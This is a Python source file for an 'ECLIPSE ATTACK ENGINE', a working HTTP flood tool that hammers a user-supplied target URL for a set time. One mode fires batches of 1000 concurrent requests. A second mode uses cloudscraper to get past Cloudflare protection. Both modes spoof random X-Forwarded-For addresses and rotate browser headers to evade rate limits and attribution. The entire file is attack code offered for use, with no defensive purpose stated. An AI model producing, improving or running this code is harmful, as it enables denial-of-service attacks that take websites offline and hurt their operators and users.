import asyncio
import aiohttp
import random
import sys
import time
import cloudscraper
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Configs
MAX_CONCURRENT = 1000  # C-ECLIPSE
MAX_CONCURRENT_CC_ECLIPSE = 100  # CC-ECLIPSE
REQUEST_TIMEOUT = 10
REQUEST_TIMEOUT_CC = 20

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/"
]

class CEclipse:
    def __init__(self, target, duration):
        self.target = target
        self.time = duration
        self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
        self.start_time = 0

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    return "SUCCESS"
                elif str(response.status).startswith('4'):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    async def run(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time

        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                results = await asyncio.gather(*tasks)

                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                elapsed = time.time() - self.start_time
                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)

                self.print_status()
                await asyncio.sleep(0.1)
        self.print_summary()

    def print_status(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nMETHOD: C-ECLIPSE | TARGET: {self.target} | TIME: {self.time}s")
        print("="*60)
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f" TIME REMAINING: {remaining:.1f}s")
        print("="*60)

    def print_summary(self):
        total_time = time.time() - self.start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        print("\nATTACK COMPLETED")
        print("="*60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVERAGE RPS: {avg_rps:.1f}")
        print("="*60)

class CCEclipse:
    def __init__(self, target, duration):
        self.target = target
        self.time = duration
        self.stats = {'total': 0, 'success': 0, 'errors': 0}
        self.start_time = 0
        self.executor = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CC_ECLIPSE)
        self.scraper = cloudscraper.create_scraper()

    def make_request(self):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        try:
            resp = self.scraper.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT_CC)
            if resp.status_code == 200:
                return "SUCCESS"
            elif str(resp.status_code).startswith("4"):
                return "ERROR"
            return "OTHER"
        except:
            return "ERROR"

    def run(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time

        while time.time() < end_time:
            futures = [self.executor.submit(self.make_request) for _ in range(MAX_CONCURRENT_CC_ECLIPSE)]
            for future in futures:
                result = future.result()
                self.stats['total'] += 1
                if result == "SUCCESS":
                    self.stats['success'] += 1
                elif result == "ERROR":
                    self.stats['errors'] += 1

            self.print_status()
            time.sleep(0.1)
        self.print_summary()

    def print_status(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nMETHOD: CC-ECLIPSE | TARGET: {self.target} | TIME: {self.time}s")
        print("="*60)
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" TIME REMAINING: {remaining:.1f}s")
        print("="*60)

    def print_summary(self):
        total_time = time.time() - self.start_time
        print("\nATTACK COMPLETED")
        print("="*60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print("="*60)

def main():
    print("\nECLIPSE ATTACK ENGINE")
    print("="*40)
    method = input("METHOD (C-ECLIPSE / CC-ECLIPSE): ").strip().upper()
    target = input("TARGET: ").strip()
    duration = int(input("TIME (seconds): ").strip())

    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"

    try:
        if method == "C-ECLIPSE":
            attack = CEclipse(target, duration)
            asyncio.run(attack.run())
        elif method == "CC-ECLIPSE":
            attack = CCEclipse(target, duration)
            attack.run()
        else:
            print("Unknown method.")
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
